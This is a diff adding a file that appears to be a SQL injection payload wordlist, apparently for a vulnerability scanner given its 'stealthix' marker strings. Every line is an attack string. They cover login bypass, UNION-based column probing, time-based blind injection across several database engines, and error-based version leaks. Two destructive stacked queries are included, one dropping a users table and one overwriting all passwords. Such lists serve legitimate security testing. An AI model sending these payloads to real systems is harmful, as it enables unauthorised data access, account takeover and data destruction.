@@ -1,0 +1,92 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+') OR ('1'='1
+') OR ('1'='1'--
+' OR 1=1 AND '1'='1
+' OR 1=1 AND 1=1
+' OR 1=1 AND 1=2
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' OR EXISTS(SELECT 1)
+' OR NOT EXISTS(SELECT 1)
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 2--
+' OR 1=1 ORDER BY 3--
+' OR 1=1 ORDER BY 4--
+' OR 1=1 ORDER BY 5--
+' OR 1=1 ORDER BY 6--
+' OR 1=1 ORDER BY 7--
+' OR 1=1 ORDER BY 8--
+' OR 1=1 ORDER BY 9--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 'stealthix'--
+' UNION SELECT 'stealthix','marker'--
+' UNION SELECT 'stealthix','marker','x'--
+' OR SLEEP(3)--
+' OR SLEEP(5)--
+' OR BENCHMARK(1000000,MD5(1))--
+' OR IF(1=1,SLEEP(3),0)--
+' OR IF(1=2,SLEEP(3),0)--
+'; SELECT pg_sleep(3);--
+'; SELECT pg_sleep(5);--
+'; SELECT pg_sleep(8);--
+'; WAITFOR DELAY '0:0:3'--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:8'--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM dual--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
+'; SELECT randomblob(1000000);--
+'; SELECT hex(randomblob(500000));--
+' OR 1=CAST((SELECT @@version) AS int)--
+' OR 1=convert(int,@@version)--
+' OR 1=to_number('text')--
+' OR 1=1 AND (SELECT 1 FROM dual)=1--
+' OR 1=1 AND (SELECT 1)=1--
+' OR 1=1 AND (SELECT 'a')='a'--
+' OR '1'='1' AND '1'='1
+' OR '1'='2' AND '1'='1
+'; SELECT 1;--
+'; SELECT 1; SELECT 2;--
+'; SELECT 1; SELECT 2; SELECT 3;--
+'; DROP TABLE users;--
+'; UPDATE users SET password='x' WHERE '1'='1';--
+')) OR ('1'='1'--
+' OR 1=1 LIMIT 1--
+' OR 1=1 GROUP BY 1--
+' OR 1=1 HAVING 1=1--
+' OR 1=1 UNION SELECT @@version--
+' OR 1=1 UNION SELECT version()--
+' OR 1=1 UNION SELECT user()--
+' OR 1=1 UNION SELECT database()--
+' OR 1=1-- -
+' OR 1=1 /*
+' OR 1=1;--
+' AND 1=1#
+' AND 1=2#
+') OR 1=1--
+') OR ('1'='1')--
+' OR 1=1 ORDER BY 10--
+' OR 1=1 UNION ALL SELECT @@version--
+' OR 1=1 UNION SELECT current_database()--
+' OR 1=1 UNION SELECT DB_NAME()--
+' OR 1=1 UNION SELECT banner FROM v$version--
